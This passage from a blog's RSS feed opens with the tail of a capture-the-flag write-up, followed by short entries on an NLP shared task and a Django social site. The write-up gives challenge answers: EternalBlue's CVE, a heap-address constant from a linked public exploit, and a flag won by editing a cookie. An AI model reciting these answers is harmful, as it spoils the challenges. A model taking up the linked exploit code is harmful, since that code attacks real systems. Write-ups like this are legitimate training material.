&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— The formal listing code (CVE) for EternalBlue is &lt;strong&gt;CVE-2017–0144&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;5. Can you search it?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— For the Vulnerability you found in question 2, There is a proof of concept. What is the string for TARGET_HAL_HEAP_ADDR_x64?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— The vulnerability being discussed is EternalBlue. We canf ind the source code at &lt;a href=&#34;https://gist.github.com/worawit/bd04bad3cd231474763b873df081c09a&#34;&gt;this link&lt;/a&gt;. There we find that TARGET_HAL_HEAP_ADDR_x64 is assigned &lt;strong&gt;0xffffffffffd00010&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;6. Who knew?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt;— This product had Highest Number Of “Distinct” Vulnerabilities in 1999&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;— A simple Google search of “Highest Number Of “Distinct” Vulnerabilities in 1999&amp;quot;, gets us the following &lt;a href=&#34;https://www.cvedetails.com/top-50-products.php?year=1999&#34;&gt;link&lt;/a&gt;. The product with the highest vulnerabilities was &lt;strong&gt;Windows NT&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;blast-from-the-past-challenges&#34;&gt;&lt;strong&gt;Blast from the Past Challenges&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;1. cookie_monster&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On inspecting the cookies, we find that the Cookie value should be the Red Guy’s name. We change the value of the cookie to &lt;code&gt;Elom&lt;/code&gt;. On refreshing the page, we get the flag as &lt;strong&gt;flag{C00kies_4r3_the_b3st}&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Review Opinion Diversificatio&amp;shy;n</title>
      <link>https://shreyansh26.github.io/project/revopid/</link>
      <pubDate>Mon, 20 Nov 2017 17:15:45 +0530</pubDate>
      <guid>https://shreyansh26.github.io/project/revopid/</guid>
      <description>&lt;p&gt;Work done as a part of the organizing team of RevOpiD, a shared task organized at IJCNLP 2017 (International Joint Conference on Natural Language Processing, Taipei, Taiwan).
The task aims to produce a top-k ranking of product reviews which can sufficiently represent the gist of opinions expressed in all the reviews of that product.
Implemented the official baseline for Subtask-B of the shared task. Also volunteered to annotate gold dataset for the shared task.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Worldlink - Social Networking Website</title>
      <link>https://shreyansh26.github.io/project/worldlink/</link>
      <pubDate>Fri, 20 Oct 2017 18:14:20 +0530</pubDate>
      <guid>https://shreyansh26.github.io/project/worldlink/</guid>
      <description>&lt;p&gt;Created a social networking website (webapp) using the Django framework as a part of my curriculum
project.&lt;/p&gt;
&lt;p&gt;Implemented features like user authentication, profile creation and edit options, posts/blogs creation,
like and comment on the posts, searching other users, personal messaging between users, following other
users and a meme generator for generating memes.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Tags</title>
      <link>https://shreyansh26.github.io/tags/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://shreyansh26.github.io/tags/</guid>
      <description>&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
